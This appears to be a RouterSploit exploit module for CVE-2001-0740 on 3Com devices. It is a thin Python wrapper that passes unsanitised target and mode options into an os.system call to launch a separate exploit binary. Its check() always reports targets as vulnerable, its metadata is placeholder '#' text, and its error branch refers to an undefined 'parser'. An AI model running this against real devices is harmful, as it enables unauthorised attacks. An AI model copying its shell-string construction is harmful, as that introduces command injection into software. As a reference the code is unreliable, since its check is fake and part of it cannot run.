



import sys,os

from routersploit.core.exploit import *

from routersploit.core.http.http_client import HTTPClient

from ctypes import *



class Exploit(HTTPClient):



    __info__ = {

        "name": "CVE-2001-0740",

        "description": "########. "

                       "########## "

                       "########### ",

        "authors": (

            "###",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "",

        ),

        "devices": (

            "3Com, CVE-2001-0740"
        ),
    }


    target = OptIP("", "dest_addr IPv4 or IPv6 address")
    port = OptPort(80, "Target FTP port")
    num = OptString("","1 (soft) || 2 (hard)")
    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = './{} {} {}'.format('CVE-2001-0740',self.num,self.target)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            parser.print_help(sys.stderr)

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
